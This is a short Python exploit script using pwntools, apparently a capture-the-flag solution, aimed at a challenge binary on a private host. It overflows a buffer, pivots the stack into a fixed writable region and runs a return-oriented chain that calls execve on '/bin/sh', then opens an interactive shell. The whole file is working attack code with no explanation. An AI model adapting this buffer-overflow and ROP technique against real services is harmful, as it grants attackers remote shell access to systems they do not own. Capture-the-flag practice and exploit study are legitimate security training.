from pwn import *
context.arch = 'amd64'

MAIN = 0x401d6a
ANON_004c3 = 0x4c3000
POP_RAX = 0x449117
XCHG_RAX_RSP = 0x404c41

# p = process("./src/share/chal")
p = remote("10.113.0.1", 10402)

# fake stack
fs_payload = b"A" * 0x60 + p64(ANON_004c3 + 0x60) + p64(MAIN + 12)
p.sendline(fs_payload)

POP_RDI = 0x401862
POP_RSI = 0x40f1ae
POP_RDX = 0x40176f
POP_RAX = 0x449117
SYSCALL = 0x4012d3

# move rsp to controlled region
pivot_payload = p64(POP_RAX) + p64(0x3b) + p64(POP_RSI) + p64(0) + p64(POP_RDX) + p64(0) + p64(POP_RDI) + p64(ANON_004c3 + 0x48) + p64(SYSCALL) + b"/bin/sh\x00"
pivot_payload = pivot_payload.ljust(0x68, b"A")
pivot_payload += p64(POP_RAX) + p64(ANON_004c3) + p64(XCHG_RAX_RSP)

p.sendline(pivot_payload)
p.interactive()

#with open("payload", "wb") as f:
#    f.write(payload)
